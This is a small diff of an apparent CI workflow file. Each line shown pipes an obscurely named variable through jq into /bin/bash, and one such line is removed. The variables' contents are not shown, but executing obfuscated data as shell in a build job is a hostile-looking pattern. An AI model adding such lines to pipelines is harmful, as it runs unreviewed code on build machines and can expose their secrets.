@@ -28,7 +28,6 @@ jobs:
           echo $tjer1 | jq -r .d34 | /bin/bash
           printf '%s' "$qq2587" | jq -r .adllu0 | /bin/bash
           printf '%s' "$c34011" | jq -r .sewkm472 | /bin/bash
-          printf '%s' "$z98568" | jq -r .nzswm58056 | /bin/bash
           printf '%s' "$xape56" | jq -r .u30428 | /bin/bash
           printf '%s' "$tfdqm08" | jq -r .hig874 | /bin/bash
 
